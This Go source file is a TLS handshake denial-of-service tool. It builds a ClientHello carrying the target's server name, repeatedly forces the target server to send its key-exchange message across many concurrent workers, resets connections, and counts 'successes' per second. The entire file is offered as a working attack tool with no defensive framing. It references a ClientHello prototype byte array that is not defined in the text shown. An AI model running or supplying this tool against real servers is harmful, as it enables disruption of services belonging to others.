package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"sync/atomic"
	"time"
)

var successes uint64
var errors uint64

var options struct {
	verbose, reopen bool
	workers         int
}

func init() {
	flag.BoolVar(&options.verbose, "v", false, "Verbose output")
	flag.BoolVar(&options.reopen, "reopen", false, "Open a new connection for every ClientHello")
	flag.IntVar(&options.workers, "workers", 1, "Number of worker go routines")
}

func sendTLSDoS(c *net.TCPConn) (bool, error) {
	c.SetWriteDeadline(time.Now().Add(time.Second))
	i := 0
	for i < len(clientHello) {
		n, err := c.Write(clientHello[i:])
		if err != nil {
			return false, err
		}
		i += n
	}
	if options.verbose {
		log.Println("Wrote ClientHello")
	}
	for {
		c.SetReadDeadline(time.Now().Add(time.Second))
		var header [5]byte
		_, err := io.ReadFull(c, header[:])
		if err != nil {
			return false, err
		}
		content := make([]byte, binary.BigEndian.Uint16(header[3:5]))
		_, err = io.ReadFull(c, content)
		if err != nil {
			return false, err
		}
		if header[0] != 22 {
			if options.verbose {
				log.Println("Invalid content type: ", header[0])
			}
			continue
		}
		if options.verbose {
			log.Println("Got handshake message type:", content[0])
		}
		if content[0] != 12 {
			continue
		}
		return true, nil
	}
}

func runTLSDoSInstance(addr *net.TCPAddr) {
	c, err := net.DialTCP("tcp", nil, addr)
	if err != nil {
		if options.verbose {
			log.Println("Error: ", err)
		}
		return
	}

	defer c.Close()

	//We can discard any data since we reset the connection
	c.SetLinger(0)
	for {
		ok, err := sendTLSDoS(c)
		if err != nil {
			atomic.AddUint64(&errors, 1)
			if options.verbose {
				log.Println(err)
			}
			return
		}
		if ok {
			atomic.AddUint64(&successes, 1)
		} else {
			atomic.AddUint64(&errors, 1)
		}
		if options.reopen {
			return
		}
	}
}

var clientHello []byte

func generatePacket(serverName string) {

	realName := strings.Split(serverName, ":")[0]
	realName = strings.Split(realName, "/")[0]
	ip := net.ParseIP(realName)
	if ip != nil {
		clientHello = clientHelloPrototype[:len(clientHelloPrototype)-9]
		return
	}

	name := []byte(realName)
	clientHello = make([]byte, len(clientHelloPrototype)+len(name))
	copy(clientHello, clientHelloPrototype)
	binary.BigEndian.PutUint16(clientHello[3:], uint16(len(clientHello)-5))   //Record Length
	binary.BigEndian.PutUint16(clientHello[7:], uint16(len(clientHello)-9))   //Handshake Length
	binary.BigEndian.PutUint16(clientHello[50:], uint16(len(clientHello)-52)) //Extension Length

	//SNI Extension lengths
	binary.BigEndian.PutUint16(clientHello[len(clientHelloPrototype)-7:],
		uint16(len(name)+5))
	binary.BigEndian.PutUint16(clientHello[len(clientHelloPrototype)-5:],
		uint16(len(name)+3))
	binary.BigEndian.PutUint16(clientHello[len(clientHelloPrototype)-2:],
		uint16(len(name)))
	copy(clientHello[len(clientHelloPrototype):], name)
}

func main() {
	flag.Parse()
	if flag.Arg(0) == "" {
		fmt.Printf("Usage: %s host:port [-v][-workers #]\n", os.Args[0])
		return
	}
	if options.verbose {
		fmt.Println("Resolving", flag.Arg(0))
	}
	addr, err := net.ResolveTCPAddr("tcp", flag.Arg(0))
	if err != nil {
		log.Println(err)
		return
	}
	if options.verbose {
		fmt.Println("Resolved!")
	}
	generatePacket(flag.Arg(0))
	for i := 0; i < options.workers; i++ {
		go func() {
			for {
				runTLSDoSInstance(addr)
			}
		}()
	}
	tckr := time.NewTicker(1 * time.Second)
	for {
		select {
		case <-tckr.C:
			fmt.Printf("Successes: %d | Errors: %d\n", atomic.SwapUint64(&successes, 0), atomic.SwapUint64(&errors, 0))
		}
	}
}
